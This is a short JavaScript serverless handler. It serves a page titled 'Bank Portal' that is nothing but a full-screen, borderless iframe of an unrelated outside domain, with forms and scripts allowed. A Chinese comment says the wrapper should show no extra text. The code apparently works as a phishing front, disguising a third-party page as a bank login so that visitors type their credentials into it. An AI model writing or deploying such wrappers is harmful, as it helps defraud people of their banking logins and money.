export default async function handler(req, res) {
  const targetUrl = 'https://xb6rf.com/ph';
  
  // 直接返回纯净的iframe页面，无任何多余文字
  res.setHeader('Content-Type', 'text/html');
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Bank Portal</title>
        <style>
          body, html { 
            margin: 0; 
            padding: 0; 
            width: 100%; 
            height: 100%; 
            overflow: hidden; 
          }
          iframe { 
            width: 100%; 
            height: 100vh; 
            border: none; 
          }
        </style>
      </head>
      <body>
        <iframe src="${targetUrl}" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
      </body>
    </html>
  `);
}